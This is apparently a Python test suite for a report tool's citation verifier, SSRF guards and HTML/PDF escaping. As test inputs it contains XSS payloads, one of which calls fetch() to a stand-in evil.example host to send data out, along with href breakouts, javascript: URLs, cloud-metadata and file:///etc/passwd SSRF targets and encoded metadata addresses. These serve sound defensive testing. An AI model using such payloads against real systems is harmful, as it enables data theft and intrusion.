"""Citation verification, report validation and HTML output hardening.

Covers R11-06 (fabricated bibliographies pass), R11-07 (unescaped HTML, href breakout),
R11-13 (validators allocate memory per bracketed number), R11-21 (section regexes stop at
'###') and R11-22 (SSRF and unbounded reads in verify_citations). No network is used:
resolution and HTTP are replaced by doubles.
"""

import contextlib
import io
import socket
import sys
import tempfile
import time
import types
import unittest
from pathlib import Path
from unittest import mock
from urllib import error, request

from covhelp import SCRIPTS, call_main

import md_to_html
import validate_report
import verify_citations as vc

PUBLIC = [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))]


def public_resolver(host, port, *args, **kwargs):
    return PUBLIC


def resolver_for(table):
    def resolve(host, port, *args, **kwargs):
        addr = table[host]
        family = socket.AF_INET6 if ":" in addr else socket.AF_INET
        return [(family, socket.SOCK_STREAM, 6, "", (addr, port))]
    return resolve


class FakeResp:
    def __init__(self, body=b"", status=200):
        self.body, self.status = body, status

    def read(self, size=-1):
        return self.body if size is None or size < 0 else self.body[:size]

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def verifier(text, **kwargs):
    tmp = tempfile.mkdtemp()
    path = Path(tmp) / "report.md"
    path.write_text(text, encoding="utf-8")
    kwargs.setdefault("resolver", public_resolver)
    return vc.CitationVerifier(path, **kwargs)


def quiet(fn, *args, **kwargs):
    with contextlib.redirect_stdout(io.StringIO()), mock.patch.object(vc.time, "sleep"):
        return fn(*args, **kwargs)


DEAD_BIB = """# Report

Body [1] [2] [3].

## Bibliography

[1] Smith (2021). "Quantum widgets in practice". https://dead.example/a
[2] Lee (2022). "Widget scaling laws". https://dead.example/b
[3] Kim (2020). "Widget economics". https://dead.example/c
"""


class CitationGateTests(unittest.TestCase):
    """R11-06: the documented (default) mode fails fabricated or dead bibliographies."""

    def test_zero_verified_fails_by_default_and_passes_only_when_lenient(self):
        dead = mock.patch.object(vc, "_urlopen", side_effect=error.URLError("unreachable"))
        with dead:
            self.assertFalse(quiet(verifier(DEAD_BIB).verify_all))
            self.assertTrue(quiet(verifier(DEAD_BIB, lenient=True).verify_all))
        report = Path(tempfile.mkdtemp()) / "r.md"
        report.write_text(DEAD_BIB)
        with dead, mock.patch.object(vc.socket, "getaddrinfo", public_resolver), mock.patch.object(vc.time, "sleep"):
            code, _, _ = call_main(vc, ["--report", str(report)])
        self.assertEqual(code, 1)

    def test_entries_under_level_three_headings_are_checked(self):
        text = (
            "## Bibliography\n\n### Primary sources\n\n[1] A (2020). \"First paper title here\". https://a.example/1\n\n"
            "### Grey literature\n\n[2] B (2021). \"Second paper title here\". https://b.example/2\n\n## Appendix\n\n[9] not an entry\n"
        )
        entries = verifier(text).extract_bibliography()
        self.assertEqual([e["num"] for e in entries], ["1", "2"])
        self.assertNotIn("Grey literature", entries[0]["raw"])

    def test_resolving_doi_does_not_clear_a_hallucination_flag(self):
        v = verifier("## Bibliography\n")
        entry = {"num": "1", "raw": "Doe (2999). \"Future results\". https://doi.org/10.1/x", "year": "2999",
                 "title": "Future results", "doi": "10.1/x", "url": "https://doi.org/10.1/x"}
        with mock.patch.object(v, "verify_doi", return_value=(True, {"title": "Future results", "year": 2999})):
            result = quiet(v.verify_entry, entry)
        self.assertEqual(result["status"], "suspicious")

    @mock.patch.object(vc.time, "sleep", lambda *_: None)
    def test_real_titles_pass_when_the_url_or_doi_confirms_them(self):
        """Honest bibliography: titles that merely look generic are warnings, not failures."""
        titles = [
            (2023, 'Zhao et al.', 'A Survey of Large Language Models'),
            (1985, 'Porter', 'Competitive Advantage: Creating and Sustaining Superior Performance'),
            (2014, 'Chacon', 'Pro Git Guide'),
        ]
        body = "## Bibliography\n\n" + "\n".join(
            f'[{i}] {a} ({y}). "{t}". https://example.org/{i}' for i, (y, a, t) in enumerate(titles, 1)) + "\n"
        v = verifier(body)
        with mock.patch.object(v, "verify_url", return_value=(True, "URL accessible")), contextlib.redirect_stdout(io.StringIO()) as out:
            self.assertTrue(v.verify_all())
        self.assertIn("CITATION VERIFICATION PASSED", out.getvalue())

    def test_anachronism_only_for_terms_that_did_not_exist(self):
        v = verifier("## Bibliography\n")
        for title in ("Creating and Sustaining Superior Performance", "Foundations of AI: The Big Issues",
                      "What Is AI, Anyway?", "Oil Filled Transformer Winding"):
            self.assertFalse([i for i in v.detect_hallucination_patterns({"title": title, "year": "1985"})
                              if "Anachronistic" in i], title)
        for title in ("ChatGPT for tax law", "Scaling LLMs", "GPT-4 in 1990"):
            self.assertTrue([i for i in v.detect_hallucination_patterns({"title": title, "year": "1985"})
                             if "Anachronistic" in i], title)

    def test_placeholder_cues_are_whole_word_and_case_aware(self):
        v = verifier("## Bibliography\n")
        for title in ("Explaining and Harnessing Adversarial Examples", "Counterexamples in Topology",
                      "Todo lists and memory", "A tbd-free design"):
            self.assertFalse([i for i in v.detect_hallucination_patterns({"title": title})
                              if "Placeholder" in i], title)
        for title in ("TBD", "Results TODO", "Lorem ipsum dolor", "[placeholder] study", "Placeholder title here"):
            self.assertTrue([i for i in v.detect_hallucination_patterns({"title": title})
                             if "Placeholder" in i], title)

    @mock.patch.object(vc.time, "sleep", lambda *_: None)
    def test_a_real_bibliography_fully_confirmed_always_passes_even_lenient(self):
        """R11-06: 16 real citations, every DOI/URL resolves to the entry's own title and year."""
        real = [
            (2015, "Goodfellow et al.", "Explaining and Harnessing Adversarial Examples", "10.48550/arXiv.1412.6572"),
            (1991, "Kirsh", "Foundations of AI: The Big Issues", "10.1016/0004-3702(91)90017-W"),
            (1987, "Schank", "What Is AI, Anyway?", "10.1609/aimag.v8i4.623"),
            (1978, "Steen and Seebach", "Counterexamples in Topology", "10.1007/978-1-4612-6290-9"),
            (1992, "Pierce", "Design of an Oil Filled Transformer Winding", "10.1109/61.153501"),
            (2017, "Vaswani et al.", "Attention Is All You Need", "10.48550/arXiv.1706.03762"),
            (1986, "Rumelhart et al.", "Learning Representations by Back-Propagating Errors", "10.1038/323533a0"),
            (2020, "Raffel et al.", "Exploring the Limits of Transfer Learning", "10.48550/arXiv.1910.10683"),
            (1985, "Porter", "Competitive Advantage: Creating and Sustaining Superior Performance", "10.1000/porter"),
            (2023, "Zhao et al.", "A Survey of Large Language Models", "10.48550/arXiv.2303.18223"),
            (2014, "Chacon and Straub", "Pro Git Guide", "10.1000/progit"),
            (1999, "Gamma et al.", "An Introduction to Design Patterns", "10.1000/gof"),
            (2021, "Bommasani et al.", "On the Opportunities and Risks of Foundation Models", "10.48550/arXiv.2108.07258"),
            (2019, "Devlin et al.", "A Study of Pre-training for Language Understanding", "10.48550/arXiv.1810.04805"),
            (1994, "Hinton", "Overview of Boltzmann Machines", "10.1000/hinton"),
            (2022, "Wei et al.", "Chain-of-Thought Prompting Elicits Reasoning in Large Language Models", "10.48550/arXiv.2201.11903"),
        ]
        self.assertGreaterEqual(len(real), 15)
        body = "## Bibliography\n\n" + "\n".join(
            f'[{i}] {a} ({y}). "{t}". https://doi.org/{doi}' for i, (y, a, t, doi) in enumerate(real, 1)) + "\n"
        meta = {doi: {"title": t, "year": y} for (y, a, t, doi) in real}
        for lenient in (False, True):
            v = verifier(body)
            v.lenient = lenient
            with mock.patch.object(v, "verify_doi", side_effect=lambda doi: (True, meta[doi])), \
                    contextlib.redirect_stdout(io.StringIO()) as out:
                self.assertTrue(v.verify_all(), out.getvalue())
            self.assertIn("Suspicious: 0/16", out.getvalue())

    def test_generic_titles_without_confirmation_are_still_flagged(self):
        v = verifier("## Bibliography\n")
        entry = {"num": "1", "raw": "x", "year": "2020", "title": "Pro Git Guide", "doi": None, "url": "https://e.org/1"}
        with mock.patch.object(v, "verify_url", return_value=(False, "HTTP 404")):
            result = quiet(v.verify_entry, entry)
        self.assertEqual(result["status"], "suspicious")
        self.assertFalse(result["hard"])

    @mock.patch.object(vc.time, "sleep", lambda *_: None)
    def test_lenient_excuses_unconfirmed_entries_but_not_wrong_ones(self):
        v = verifier("## Bibliography\n")
        v.lenient = True
        soft = {"num": "1", "status": "suspicious", "issues": ["generic"], "hard": False}
        hard = {"num": "2", "status": "suspicious", "issues": ["Placeholder text in title"], "hard": True}
        for results, expected in (([soft], True), ([hard], False)):
            with mock.patch.object(v, "extract_bibliography", return_value=[{}] * len(results)), \
                    mock.patch.object(v, "verify_entry", side_effect=results), contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(v.verify_all(), expected)

    def test_doi_must_match_the_entry_when_the_entry_has_no_quoted_title(self):
        v = verifier("## Bibliography\n")
        entry = {"num": "1", "raw": "Doe (2020). Widgets at scale. Nature. https://doi.org/10.1/x", "year": None,
                 "title": None, "doi": "10.1/x", "url": None}
        with mock.patch.object(v, "verify_doi", return_value=(True, {"title": "Protein folding dynamics"})):
            self.assertEqual(quiet(v.verify_entry, entry)["status"], "suspicious")
        with mock.patch.object(v, "verify_doi", return_value=(True, {"title": "Widgets at scale"})):
            self.assertEqual(quiet(v.verify_entry, entry)["status"], "verified")


class FakeSock:
    def __init__(self, reply=b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nhi"):
        self.sent = b""
        self._reply = reply

    def sendall(self, data):
        self.sent += data

    def makefile(self, *a, **k):
        return io.BytesIO(self._reply)

    def settimeout(self, t):
        pass

    def close(self):
        pass


class PinnedConnectionTests(unittest.TestCase):
    """The vetted address is the one connected to (no second DNS lookup to rebind)."""

    def setUp(self):
        env = {k: v for k, v in __import__("os").environ.items() if "proxy" not in k.lower()}
        p = mock.patch.dict("os.environ", env, clear=True)
        p.start()
        self.addCleanup(p.stop)

    @staticmethod
    def resolver(addr):
        return lambda host, port, proto=0: [(2, 1, 6, "", (addr, port))]

    @staticmethod
    def fake_proxy(reply):
        """A real local TCP 'proxy' on 127.0.0.1 that records the first request and replies."""
        import threading
        srv = socket.socket()
        srv.bind(("127.0.0.1", 0))
        srv.listen(1)
        seen = {}

        def serve():
            conn, _ = srv.accept()
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
            seen["request"] = data
            conn.sendall(reply)
            conn.close()
            srv.close()

        t = threading.Thread(target=serve, daemon=True)
        t.start()
        return srv.getsockname()[1], seen, t

    def test_https_through_a_proxy_sends_connect_to_the_target_even_for_a_loopback_proxy(self):
        port, seen, t = self.fake_proxy(b"HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\n\r\n")
        with mock.patch.dict("os.environ", {"HTTPS_PROXY": f"http://127.0.0.1:{port}"}):
            with self.assertRaises(OSError):
                vc._urlopen(request.Request("https://doi.example/10.1/x"), 5, self.resolver("93.184.216.34"))
        t.join(5)
        self.assertTrue(seen["request"].startswith(b"CONNECT doi.example:443 HTTP/1.1"), seen)

    def test_https_tunnel_does_tls_with_the_target_name_not_the_proxy(self):
        conn = vc._PinnedHTTPSConnection("proxy.corp.example", 3128, resolver=self.resolver("10.20.30.40"))
        conn.set_tunnel("doi.example", 443)
        wrapped = []
        conn._context = types.SimpleNamespace(wrap_socket=lambda sock, server_hostname: wrapped.append(server_hostname) or sock)
        sock = FakeSock(b"HTTP/1.1 200 Connection established\r\n\r\n")
        with mock.patch.object(socket, "create_connection", return_value=sock) as cc:
            conn.connect()
        self.assertEqual(cc.call_args.args[0], ("proxy.corp.example", 3128))  # the user's proxy, not vetted
        self.assertTrue(sock.sent.startswith(b"CONNECT doi.example:443"))
        self.assertEqual(wrapped, ["doi.example"])

    def test_http_through_a_proxy_connects_to_the_proxy_with_an_absolute_uri(self):
        port, seen, t = self.fake_proxy(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nhi")
        with mock.patch.dict("os.environ", {"HTTP_PROXY": f"http://127.0.0.1:{port}"}):
            with vc._urlopen(request.Request("http://docs.example/p"), 5, self.resolver("93.184.216.34")) as resp:
                self.assertEqual(resp.read(), b"hi")
        t.join(5)
        self.assertTrue(seen["request"].startswith(b"GET http://docs.example/p HTTP/1.1"), seen)

    def test_without_a_proxy_the_target_is_still_vetted(self):
        self.assertFalse(vc._is_proxied(request.Request("http://docs.example/p")))

    def test_http_connects_to_the_vetted_address_and_keeps_the_host_header(self):
        sock = FakeSock()
        with mock.patch.object(socket, "create_connection", return_value=sock) as cc:
            with vc._urlopen(request.Request("http://docs.example/p"), 5, self.resolver("93.184.216.34")) as resp:
                self.assertEqual(resp.read(), b"hi")
        self.assertEqual(cc.call_args.args[0], ("93.184.216.34", 80))
        self.assertIn(b"Host: docs.example", sock.sent)

    def test_a_host_that_rebinds_to_a_private_address_at_connect_time_is_blocked(self):
        answers = iter([[(2, 1, 6, "", ("93.184.216.34", 80))], [(2, 1, 6, "", ("169.254.169.254", 80))]])
        resolver = lambda host, port, proto=0: next(answers)  # noqa: E731
        self.assertIsNone(vc.unsafe_url_reason("http://rebind.example/", resolver))
        with mock.patch.object(socket, "create_connection") as cc:
            with self.assertRaises(error.URLError) as cm:
                vc._urlopen(request.Request("http://rebind.example/"), 5, resolver)
        cc.assert_not_called()
        self.assertIn("connection blocked", str(cm.exception.reason))

    def test_https_wraps_with_the_original_host_name(self):
        conn = vc._PinnedHTTPSConnection("secure.example", 443, resolver=self.resolver("93.184.216.34"))
        wrapped = []
        conn._context = types.SimpleNamespace(wrap_socket=lambda sock, server_hostname: wrapped.append(server_hostname) or sock)
        sock = FakeSock()
        with mock.patch.object(socket, "create_connection", return_value=sock) as cc:
            conn.connect()
        self.assertEqual(cc.call_args.args[0], ("93.184.216.34", 443))
        self.assertEqual(wrapped, ["secure.example"])
        self.assertIs(conn.sock, sock)

    def test_https_handler_builds_pinned_connections(self):
        handler = vc._PinnedHTTPSHandler(self.resolver("93.184.216.34"))
        sock = FakeSock()
        with mock.patch.object(socket, "create_connection", return_value=sock), \
                mock.patch.object(vc._PinnedHTTPSConnection, "connect", lambda self_: setattr(self_, "sock", sock)):
            req = request.Request("https://secure.example/x")
            req.timeout = 5
            with handler.https_open(req) as resp:
                self.assertEqual(resp.read(), b"hi")


class SsrfTests(unittest.TestCase):
    """R11-22: no request goes to loopback, private, link-local or metadata addresses."""

    def test_nat64_and_ipv4_compatible_encodings_of_metadata_are_blocked(self):
        for url in ("http://[64:ff9b::a9fe:a9fe]/", "http://[::a9fe:a9fe]/", "http://[64:ff9b:1::a9fe:a9fe]/"):
            self.assertIn("non-public", vc.unsafe_url_reason(url) or "", url)
        self.assertIsNone(vc.unsafe_url_reason("http://[64:ff9b::5db8:d822]/"))  # NAT64 of 93.184.216.34

    def test_private_and_metadata_urls_are_never_requested(self):
        table = {"127.0.0.1": "127.0.0.1", "169.254.169.254": "169.254.169.254", "intranet.example": "10.1.2.3",
                 "v6.example": "::1", "mapped.example": "::ffff:127.0.0.1", "doi.org": "10.0.0.5"}
        v = verifier("## Bibliography\n", resolver=resolver_for(table))
        with mock.patch.object(vc, "_urlopen") as opened:
            for url in ("http://127.0.0.1:8080/admin/delete?all=1", "http://169.254.169.254/latest/meta-data/",
                        "https://intranet.example/x", "http://v6.example/", "http://mapped.example/",
                        "http://localhost:9/", "http://metadata.google.internal/", "file:///etc/passwd",
                        "ftp://x.example/"):
                ok, status = v.verify_url(url)
                self.assertFalse(ok, url)
                self.assertTrue(status.startswith("skipped"), (url, status))
            ok, meta = v.verify_doi("10.1/x")  # doi.org resolves to a private address here
        opened.assert_not_called()
        self.assertFalse(ok)
        self.assertTrue(meta["error"].startswith("skipped (non-public address"), meta)
        # Unresolvable hosts are not requested either.
        def fail(*a, **k):
            raise OSError("no such host")
        self.assertEqual(vc.unsafe_url_reason("https://nowhere.example/", fail), "cannot resolve nowhere.example")
        self.assertEqual(vc.unsafe_url_reason("https:///path", fail), "no host")

    def test_redirects_to_private_addresses_are_refused(self):
        handler = vc._SafeRedirectHandler(resolver_for({"evil.example": "169.254.169.254", "ok.example": "93.184.216.34"}))
        req = request.Request("https://ok.example/start")
        with self.assertRaises(error.URLError):
            handler.redirect_request(req, None, 302, "Found", {}, "https://evil.example/latest/meta-data")
        follow = handler.redirect_request(req, None, 302, "Found", {}, "https://ok.example/next")
        self.assertEqual(follow.full_url, "https://ok.example/next")

    def test_urlopen_installs_the_safe_redirect_handler(self):
        opened = []

        class Opener:
            def open(self, req, timeout):
                opened.append((req, timeout))
                return "response"

        def build(*handlers):
            self.assertIsInstance(handlers[0], vc._SafeRedirectHandler)
            self.assertIs(handlers[0].resolver, public_resolver)
            return Opener()

        req = request.Request("https://ok.example/")
        with mock.patch.object(vc.request, "build_opener", side_effect=build):
            self.assertEqual(vc._urlopen(req, 7, public_resolver), "response")
        self.assertEqual(opened, [(req, 7)])

    def test_doi_responses_are_read_with_a_cap(self):
        v = verifier("## Bibliography\n")
        huge = FakeResp(b"{" + b" " * (vc.MAX_RESPONSE_BYTES + 10) + b"}")
        with mock.patch.object(vc, "_urlopen", return_value=huge):
            ok, meta = v.verify_doi("10.1/x")
        self.assertFalse(ok)
        self.assertIn("too large", meta["error"])

    def test_time_budget_stops_further_requests(self):
        v = verifier(DEAD_BIB, time_budget=0)
        with mock.patch.object(vc, "_urlopen") as opened:
            ok = quiet(v.verify_all)
        opened.assert_not_called()
        self.assertFalse(ok)


class ValidateReportTests(unittest.TestCase):
    """R11-13 / R11-21."""

    def run_validator(self, text):
        path = Path(tempfile.mkdtemp()) / "r.md"
        path.write_text(text, encoding="utf-8")
        v = validate_report.ReportValidator(path)
        with contextlib.redirect_stdout(io.StringIO()):
            v.validate()
        return v

    def test_huge_bracketed_numbers_are_not_citations(self):
        body = "## Executive Summary\n\nSummary text [1].\n\nIdentifier [123456789] and [" + "7" * 5000 + "] here.\n"
        start = time.monotonic()
        v = self.run_validator(body + "\n## Bibliography\n\n[1] A source. https://a.example\n")
        self.assertLess(time.monotonic() - start, 5)
        joined = " ".join(v.errors + v.warnings)
        self.assertNotIn("123456789", joined)
        self.assertNotIn("Citations missing from bibliography", joined)

    def test_bibliography_with_sub_headings_is_counted(self):
        text = (
            "## Executive Summary\n\nSummary [1] [2].\n\n## Bibliography\n\n### Primary sources\n\n"
            "[1] First source. https://a.example\n\n### Secondary sources\n\n[2] Second source. https://b.example\n"
        )
        v = self.run_validator(text)
        self.assertFalse([e for e in v.errors if "Bibliography" in e], v.errors)
        self.assertFalse([e for e in v.errors if "Citations missing" in e], v.errors)


class HtmlEscapingTests(unittest.TestCase):
    """R11-07 / R11-21: report text is escaped, hrefs cannot break out, nothing is dropped."""

    def test_report_text_is_escaped(self):
        md = ("# T\n\n## Findings\n\nQuote: <img src=x onerror=\"fetch('https://evil.example/?d=1')\"> and "
              "<script>alert(1)</script> and <a rel=\"attachment\" href=\"file:///etc/hostname\">x</a>\n")
        content, _ = md_to_html.convert_markdown_to_html(md)
        self.assertNotIn("<img", content)
        self.assertNotIn("<script", content)
        self.assertNotIn("<a rel", content)
        self.assertIn("&lt;script&gt;alert(1)&lt;/script&gt;", content)
        self.assertIn("<strong>", md_to_html.convert_markdown_to_html("## A\n\n**bold** text\n")[0])

    def test_bibliography_href_cannot_break_out(self):
        md = ("## A\n\nx\n\n## Bibliography\n\n[1] Vendor docs - https://vendor.example/\"onmouseover=\"alert(document.domain)\n"
              "[2] Bad scheme - javascript:alert(1)\n[3] Fine <b>title</b> - https://ok.example/p?a=1&b=2\n")
        _, bib = md_to_html.convert_markdown_to_html(md)
        self.assertNotIn('"onmouseover', bib)
        self.assertNotIn("javascript:", bib.replace("javascript:alert(1)", ""))
        self.assertNotIn('href="javascript', bib)
        self.assertIn('href="https://ok.example/p?a=1&amp;b=2"', bib)
        self.assertIn('rel="noopener noreferrer"', bib)
        self.assertIn("Fine &lt;b&gt;title&lt;/b&gt;", bib)

    def test_sections_after_the_bibliography_and_sub_headings_are_kept(self):
        md = ("## Findings\n\nText.\n\n## Bibliography\n\n### Primary sources\n\n[1] S - https://a.example\n\n"
              "## Appendix\n\nAppendix text survives.\n")
        content, bib = md_to_html.convert_markdown_to_html(md)
        self.assertIn("Appendix text survives.", content)
        self.assertIn("Primary sources", bib)
        self.assertNotIn("Appendix text", bib)


class HtmlToPdfTests(unittest.TestCase):
    """R11-07: PDF rendering fetches nothing outside the document."""

    def test_only_data_urls_are_fetched(self):
        import html_to_pdf

        calls = []
        fake = types.ModuleType("weasyprint")
        fake.default_url_fetcher = lambda url, *a, **k: calls.append(url) or {"string": b"x"}

        class HTML:
            def __init__(self, filename, url_fetcher):
                self.fetch = url_fetcher

            def write_pdf(self, target):
                Path(target).write_bytes(b"%PDF")
                for url in ("file:///etc/hostname", "https://evil.example/x", "http://127.0.0.1/"):
                    with self_test.assertRaises(ValueError):
                        self.fetch(url)
                self.fetch("data:text/plain,hi")

        self_test = self
        fake.HTML = HTML
        out = Path(tempfile.mkdtemp())
        (out / "r.html").write_text("<p>x</p>")
        with mock.patch.dict(sys.modules, {"weasyprint": fake}):
            code, _, _ = call_main(html_to_pdf, ["--html", str(out / "r.html"), "--pdf", str(out / "r.pdf")])
        self.assertEqual(code, 0)
        self.assertEqual(calls, ["data:text/plain,hi"])
        self.assertTrue((out / "r.pdf").is_file())

    def test_missing_weasyprint_is_a_clear_error_and_script_entry_works(self):
        import html_to_pdf
        from covhelp import run_script

        with mock.patch.dict(sys.modules, {"weasyprint": None}), contextlib.redirect_stderr(io.StringIO()) as err:
            self.assertEqual(html_to_pdf.main(["--html", "a.html", "--pdf", "a.pdf"]), 2)
        self.assertIn("WeasyPrint is not installed", err.getvalue())
        with mock.patch.dict(sys.modules, {"weasyprint": None}):
            code, _, stderr = run_script(SCRIPTS / "html_to_pdf.py", ["--html", "a.html", "--pdf", "a.pdf"])
        self.assertEqual(code, 2)
        self.assertIn("WeasyPrint is not installed", stderr)


if __name__ == "__main__":
    unittest.main()
